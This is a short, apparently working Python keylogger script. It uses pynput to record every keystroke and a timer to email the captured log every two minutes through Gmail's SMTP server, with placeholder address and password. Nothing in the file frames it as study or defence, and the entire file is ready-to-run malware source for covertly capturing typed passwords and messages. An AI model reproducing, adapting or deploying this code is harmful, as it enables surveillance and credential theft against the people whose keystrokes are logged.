#!/usr/bin/env python

import pynput.keyboard
import threading
import smtplib


class Keylogger:

    def __init__(self):
        self.log = "\n\nKey logger has started"
        self.keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key)
        self.log_buffer = ""

    def send_mail(self, email, password, message):
        try:
            self.server = smtplib.SMTP("smtp.gmail.com", 587)
            self.server.starttls()
            self.server.login(email, password)
            if not self.log_buffer:
                self.server.sendmail(email, email, message)
                self.server.quit()
            else:
                message = self.log_buffer + message
                self.server.sendmail(email, email, message)
                self.server.quit()
                self.log_buffer = ""

        except Exception:
            self.log_buffer = self.log_buffer + self.log.strip("\n\n")

    def process_key(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            elif key == key.cmd:
                self.log = self.log + "(windwosKey)"
            else:
                self.log = self.log + " " + str(key) + " "

    def report(self):
        self.send_mail("Your email id ", "Your Password ", self.log)
        self.log = "\n\n"
        timer = threading.Timer(120, self.report)
        timer.start()

    def run(self):
        with self.keyboard_listener:
            self.report()
            self.keyboard_listener.join()


method = Keylogger()
method.run()
